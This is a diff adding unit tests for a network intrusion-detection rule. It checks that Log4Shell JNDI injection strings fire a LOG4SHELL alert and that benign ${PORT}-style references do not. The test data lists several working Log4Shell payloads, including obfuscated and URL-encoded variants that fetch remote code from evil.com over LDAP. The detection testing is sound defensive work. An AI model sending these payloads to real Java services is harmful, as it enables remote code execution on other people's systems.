@@ -779,5 +779,43 @@ class TestPayloadRule(unittest.TestCase):
         self.assertIn("ICS_TRISTATION_EXPLOIT", sigs)
 
 
+    def test_log4shell_standard_and_obfuscated_variants(self):
+        """Verifies detection of Log4Shell across standard, nested-obfuscated, and URL-encoded forms."""
+        rule = PayloadRule()
+        test_payloads = [
+            b"${jndi:ldap://192.168.1.100:1389/Exploit}",
+            b"${${lower:j}ndi:ldap://evil.com/x}",
+            b"${${upper:j}ndi:ldap://evil.com/x}",
+            b"${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x}",
+            b"${${:-j}${:-n}${:-d}${:-i}:ldap://evil.com/x}",
+            b"${${:-j}ndi:ldap://evil.com/x}",
+            b"GET /login?q=%24%7B%24%7B%3A%3A-j%7D%24%7B%3A%3A-n%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-i%7D%3Aldap%3A%2F%2Fevil.com%2Fa%7D HTTP/1.1\r\n\r\n",
+        ]
+        for idx, payload in enumerate(test_payloads):
+            pkt = {
+                "type": "IP", "protocol": "TCP", "src_ip": f"192.168.1.{10+idx}", "dst_ip": "192.168.1.2",
+                "src_port": 50000 + idx, "dst_port": 8080, "payload": payload, "timestamp": 200.0 + idx
+            }
+            alert = rule.check(pkt)
+            self.assertIsNotNone(alert, f"Log4Shell payload variant {idx} failed to fire: {payload!r}")
+            sigs = [hit["signature"] for hit in alert["evidence"]["hits"]]
+            self.assertIn("LOG4SHELL", sigs)
+            self.assertEqual(alert["severity"], "high")
+
+    def test_log4shell_benign_environment_variable_does_not_fire(self):
+        """Ensures ordinary environment variable references (${PORT}, ${USER}) do not trigger LOG4SHELL."""
+        rule = PayloadRule()
+        pkt = {
+            "type": "IP", "protocol": "TCP", "src_ip": "192.168.1.50", "dst_ip": "192.168.1.2",
+            "src_port": 51234, "dst_port": 80,
+            "payload": b"POST /config HTTP/1.1\r\nHost: example.com\r\n\r\nlisten_port=${PORT}\nuser=${USER}\n",
+            "timestamp": 300.0,
+        }
+        alert = rule.check(pkt)
+        if alert:
+            sigs = [hit["signature"] for hit in alert["evidence"]["hits"]]
+            self.assertNotIn("LOG4SHELL", sigs)
+
+
 if __name__ == "__main__":
     unittest.main()
